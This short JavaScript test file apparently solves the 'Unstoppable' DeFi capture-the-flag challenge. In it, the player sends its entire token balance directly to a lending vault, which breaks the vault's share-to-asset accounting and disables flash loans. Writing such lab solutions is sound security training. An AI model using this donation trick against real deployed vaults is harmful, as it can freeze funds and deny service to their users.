...
describe('[Challenge] Unstoppable', function () {
    ...
    it('Execution', async function () {
        let receiverContractBalance = await token.balanceOf(player.address);
        await token.connect(player).transfer(vault.address,receiverContractBalance);
        let lenderTotalAssets =  await vault.totalAssets();
        let lenderTotalSupply =  await vault.totalSupply();
        // console.log(
        //     "receiverContractBalance: ",receiverContractBalance, "\n",
        //     "lenderTotalAssets: ",lenderTotalAssets, "\n",
        //     "lenderTotalSupply: ",lenderTotalSupply, "\n",
        // );
    });
